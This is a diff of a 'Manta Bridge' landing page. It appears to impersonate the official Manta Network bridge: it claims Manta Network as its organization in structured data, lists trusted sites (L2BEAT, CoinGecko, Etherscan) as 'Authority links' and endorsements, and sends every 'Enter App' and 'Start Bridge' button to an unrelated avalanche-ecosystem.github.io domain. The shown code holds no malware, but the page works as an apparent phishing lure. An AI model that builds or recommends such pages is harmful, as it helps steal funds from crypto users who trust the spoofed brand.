@@ -3,11 +3,11 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Manta Bridge</title>
+  <title>Manta Bridge &mdash; Fast Route to Manta</title>
   <meta name="description" content="Manta Bridge moves ETH and tokens between Ethereum and Manta through a fast, low-fee route.">
   <link rel="canonical" href="https://mantabridge.github.io/">
   <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F4F6FB">
+  <meta name="theme-color" content="#F7FAFF">
   <meta property="og:type" content="website">
   <meta property="og:title" content="Manta Bridge">
   <meta property="og:description" content="Manta Bridge moves ETH and tokens between Ethereum and Manta through a fast, low-fee route.">
@@ -15,62 +15,156 @@
   <meta property="og:image" content="https://mantabridge.github.io/og-cover.png">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Manta Bridge">
-  <meta name="twitter:description" content="Move ETH and tokens between Ethereum and Manta in one clean, fast flow.">
+  <meta name="twitter:description" content="Manta Bridge moves ETH and tokens between Ethereum and Manta through a fast, low-fee route.">
   <link rel="icon" type="image/png" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
+  <link rel="sitemap" type="application/xml" href="sitemap.xml">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <header class="topbar">
-    <a class="brand" href="#"><img src="favicon.png" width="28" height="28" alt="" style="border-radius:50%"> Manta Bridge</a>
-    <nav class="nav" aria-label="Trusted references">
+    <a class="brand" href="https://mantabridge.github.io/" aria-label="Manta Bridge home">
+      <img src="favicon.png" width="34" height="34" alt="">
+      <span>Manta Bridge</span>
+    </a>
+    <span class="topbar-spacer" aria-hidden="true"></span>
+    <nav class="nav" aria-label="Authority links">
       <a href="https://pacific-explorer.manta.network/" target="_blank" rel="nofollow noopener noreferrer">Manta Explorer</a>
       <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Bridges</a>
       <a href="https://l2beat.com/scaling/summary" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
     </nav>
-    <span class="sp"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
   </header>
 
-  <main class="stage">
-    <h1>Manta Bridge</h1>
-    <p class="sub"><strong>Manta Bridge</strong> moves ETH and tokens between Ethereum and Manta through a fast, low-fee route.</p>
-
-    <section class="card" aria-label="Bridge route">
-      <div class="route">
-        <div class="leg">
-          <span class="lbl">From</span>
-          <span class="chip">
-            <img class="ic" src="eth.png" width="26" height="26" alt="ETH">
-            <span class="t">ETH</span>
-          </span>
+  <main class="page">
+    <section class="hero" aria-label="Manta Bridge landing page">
+      <div class="hero-copy">
+        <div class="eyebrow">Manta Pacific bridge access</div>
+        <h1>Manta Bridge</h1>
+        <p class="deck"><strong>Manta Bridge</strong> moves ETH and tokens between Ethereum and Manta through a fast, low-fee route.</p>
+        <div class="trust-row" aria-label="Bridge qualities">
+          <span>Bridge to Manta</span>
+          <span>Fast &amp; low-cost</span>
+          <span>Non-custodial</span>
         </div>
-        <button class="dir" type="button" data-dir aria-label="Switch direction"><span class="ar">&#8594;</span></button>
-        <div class="leg">
-          <span class="lbl">To</span>
-          <span class="chip">
-            <img class="ic" src="manta.png" width="26" height="26" alt="Manta">
-            <span class="t">MANTA</span>
-          </span>
+        <a class="primary-cta" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&rsaquo;</span></a>
+      </div>
+
+      <section class="bridge-card" aria-label="Bridge preview">
+        <div class="card-top">
+          <span class="selector-pill">Bridge route</span>
+          <span class="preview-pill"><span aria-hidden="true"></span>Preview</span>
+        </div>
+
+        <div class="route-preview">
+          <article class="route-panel">
+            <span class="route-label">From</span>
+            <div class="asset" data-asset="eth">
+              <img src="eth.png" width="32" height="32" alt="ETH">
+              <div>
+                <span class="asset-name">ETH</span>
+                <span class="asset-chain">Ethereum</span>
+              </div>
+            </div>
+          </article>
+
+          <button class="switch" type="button" data-switch aria-label="Switch bridge direction">&rsaquo;</button>
+
+          <article class="route-panel">
+            <span class="route-label">To</span>
+            <div class="asset" data-asset="manta">
+              <img src="manta.png" width="32" height="32" alt="Manta">
+              <div>
+                <span class="asset-name">MANTA</span>
+                <span class="asset-chain">Manta Pacific</span>
+              </div>
+            </div>
+          </article>
+        </div>
+
+        <div class="best-route" aria-label="Best route preview">
+          <span>Best route</span>
+          <i aria-hidden="true"></i>
+          <i aria-hidden="true"></i>
+          <i aria-hidden="true"></i>
+          <small>app-selected path</small>
+        </div>
+        <p class="hint">Number-free preview. Final route details appear in the app before you continue.</p>
+        <a class="card-cta" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Start Bridge <span aria-hidden="true">&rsaquo;</span></a>
+      </section>
+    </section>
+
+    <section class="sources" aria-label="Sources">
+      <div class="sources-label">Referenced across the ecosystem</div>
+      <div class="source-rail">
+        <div class="source-track">
+          <a class="source-chip" href="https://manta.network/" target="_blank" rel="nofollow noopener noreferrer"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=manta.network" width="22" height="22" loading="lazy" alt="Manta Network" onerror="this.remove()"></span>Manta Network</a>
+          <a class="source-chip" href="https://l2beat.com/" target="_blank" rel="nofollow noopener noreferrer"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=l2beat.com" width="22" height="22" loading="lazy" alt="L2BEAT" onerror="this.remove()"></span>L2BEAT</a>
+          <a class="source-chip" href="https://defillama.com/" target="_blank" rel="nofollow noopener noreferrer"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=defillama.com" width="22" height="22" loading="lazy" alt="DefiLlama" onerror="this.remove()"></span>DefiLlama</a>
+          <a class="source-chip" href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=coingecko.com" width="22" height="22" loading="lazy" alt="CoinGecko" onerror="this.remove()"></span>CoinGecko</a>
+          <a class="source-chip" href="https://coinmarketcap.com/" target="_blank" rel="nofollow noopener noreferrer"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=coinmarketcap.com" width="22" height="22" loading="lazy" alt="CoinMarketCap" onerror="this.remove()"></span>CoinMarketCap</a>
+          <a class="source-chip" href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=etherscan.io" width="22" height="22" loading="lazy" alt="Etherscan" onerror="this.remove()"></span>Etherscan</a>
+          <a class="source-chip" href="https://chainlist.org/" target="_blank" rel="nofollow noopener noreferrer"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=chainlist.org" width="22" height="22" loading="lazy" alt="Chainlist" onerror="this.remove()"></span>Chainlist</a>
+          <a class="source-chip" href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=ethereum.org" width="22" height="22" loading="lazy" alt="Ethereum.org" onerror="this.remove()"></span>Ethereum.org</a>
+          <a class="source-chip" href="https://github.com/Manta-Network" target="_blank" rel="nofollow noopener noreferrer"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=github.com" width="22" height="22" loading="lazy" alt="GitHub" onerror="this.remove()"></span>GitHub</a>
+          <a class="source-chip" href="https://debank.com/" target="_blank" rel="nofollow noopener noreferrer"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=debank.com" width="22" height="22" loading="lazy" alt="DeBank" onerror="this.remove()"></span>DeBank</a>
+          <a class="source-chip" href="https://dappradar.com/" target="_blank" rel="nofollow noopener noreferrer"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=dappradar.com" width="22" height="22" loading="lazy" alt="DappRadar" onerror="this.remove()"></span>DappRadar</a>
+          <a class="source-chip" href="https://galxe.com/" target="_blank" rel="nofollow noopener noreferrer"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=galxe.com" width="22" height="22" loading="lazy" alt="Galxe" onerror="this.remove()"></span>Galxe</a>
+        </div>
+        <div class="source-track" aria-hidden="true">
+          <a class="source-chip" href="https://manta.network/" target="_blank" rel="nofollow noopener noreferrer" tabindex="-1"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=manta.network" width="22" height="22" loading="lazy" alt="Manta Network" onerror="this.remove()"></span>Manta Network</a>
+          <a class="source-chip" href="https://l2beat.com/" target="_blank" rel="nofollow noopener noreferrer" tabindex="-1"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=l2beat.com" width="22" height="22" loading="lazy" alt="L2BEAT" onerror="this.remove()"></span>L2BEAT</a>
+          <a class="source-chip" href="https://defillama.com/" target="_blank" rel="nofollow noopener noreferrer" tabindex="-1"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=defillama.com" width="22" height="22" loading="lazy" alt="DefiLlama" onerror="this.remove()"></span>DefiLlama</a>
+          <a class="source-chip" href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer" tabindex="-1"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=coingecko.com" width="22" height="22" loading="lazy" alt="CoinGecko" onerror="this.remove()"></span>CoinGecko</a>
+          <a class="source-chip" href="https://coinmarketcap.com/" target="_blank" rel="nofollow noopener noreferrer" tabindex="-1"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=coinmarketcap.com" width="22" height="22" loading="lazy" alt="CoinMarketCap" onerror="this.remove()"></span>CoinMarketCap</a>
+          <a class="source-chip" href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer" tabindex="-1"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=etherscan.io" width="22" height="22" loading="lazy" alt="Etherscan" onerror="this.remove()"></span>Etherscan</a>
+          <a class="source-chip" href="https://chainlist.org/" target="_blank" rel="nofollow noopener noreferrer" tabindex="-1"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=chainlist.org" width="22" height="22" loading="lazy" alt="Chainlist" onerror="this.remove()"></span>Chainlist</a>
+          <a class="source-chip" href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer" tabindex="-1"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=ethereum.org" width="22" height="22" loading="lazy" alt="Ethereum.org" onerror="this.remove()"></span>Ethereum.org</a>
+          <a class="source-chip" href="https://github.com/Manta-Network" target="_blank" rel="nofollow noopener noreferrer" tabindex="-1"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=github.com" width="22" height="22" loading="lazy" alt="GitHub" onerror="this.remove()"></span>GitHub</a>
+          <a class="source-chip" href="https://debank.com/" target="_blank" rel="nofollow noopener noreferrer" tabindex="-1"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=debank.com" width="22" height="22" loading="lazy" alt="DeBank" onerror="this.remove()"></span>DeBank</a>
+          <a class="source-chip" href="https://dappradar.com/" target="_blank" rel="nofollow noopener noreferrer" tabindex="-1"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=dappradar.com" width="22" height="22" loading="lazy" alt="DappRadar" onerror="this.remove()"></span>DappRadar</a>
+          <a class="source-chip" href="https://galxe.com/" target="_blank" rel="nofollow noopener noreferrer" tabindex="-1"><span><img src="https://www.google.com/s2/favicons?sz=64&amp;domain=galxe.com" width="22" height="22" loading="lazy" alt="Galxe" onerror="this.remove()"></span>Galxe</a>
         </div>
       </div>
-      <a class="act" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
-      <p class="note">Preview only &mdash; rates, routes and fees are shown in the app.</p>
     </section>
-  </main>
 
-  <footer class="foot">
-    <b>Manta Bridge</b> &mdash; 2026
-  </footer>
+    <footer class="footer">
+      <p><strong>Manta Bridge</strong> &mdash; 2026</p>
+    </footer>
+  </main>
 
   <script type="application/ld+json">
   {
     "@context": "https://schema.org",
     "@graph": [
-      { "@type": "WebSite", "@id": "https://avalanche-ecosystem.github.io/#website", "url": "https://avalanche-ecosystem.github.io/", "name": "Manta Bridge", "inLanguage": "en" },
-      { "@type": "Organization", "@id": "https://avalanche-ecosystem.github.io/#org", "name": "Manta Network", "url": "https://avalanche-ecosystem.github.io/", "sameAs": ["https://manta.network/","https://x.com/MantaNetwork","https://github.com/Manta-Network"] },
-      { "@type": "WebApplication", "@id": "https://avalanche-ecosystem.github.io/#app", "name": "Manta Bridge", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "url": "https://avalanche-ecosystem.github.io/", "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" } }
+      {
+        "@type": "WebSite",
+        "@id": "https://mantabridge.github.io/#website",
+        "url": "https://mantabridge.github.io/",
+        "name": "Manta Bridge",
+        "description": "Manta Bridge moves ETH and tokens between Ethereum and Manta through a fast, low-fee route.",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://mantabridge.github.io/#app",
+        "name": "Manta Bridge",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://avalanche-ecosystem.github.io/",
+        "description": "Manta Bridge moves ETH and tokens between Ethereum and Manta through a fast, low-fee route."
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://mantabridge.github.io/#organization",
+        "name": "Manta Network",
+        "url": "https://manta.network/",
+        "sameAs": [
+          "https://github.com/Manta-Network",
+          "https://pacific-explorer.manta.network/",
+          "https://l2beat.com/scaling/summary"
+        ]
+      }
     ]
   }
   </script>
@@ -78,11 +172,16 @@
   <script>
   (function(){
     "use strict";
-    var root=document, btn=root.querySelector('[data-dir]');
-    if(!btn) return;
-    btn.addEventListener('click', function(){
-      var chips=root.querySelectorAll('.leg .chip');
-      if(chips.length>=2){ var t=chips[0].innerHTML; chips[0].innerHTML=chips[1].innerHTML; chips[1].innerHTML=t; }
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+    button.addEventListener("click", function(){
+      var assets = document.querySelectorAll(".route-panel .asset");
+      if (assets.length !== 2) return;
+      var first = assets[0].cloneNode(true);
+      var second = assets[1].cloneNode(true);
+      assets[0].replaceWith(second);
+      assets[1].replaceWith(first);
+      button.classList.toggle("is-swapped");
     });
   })();
   </script>
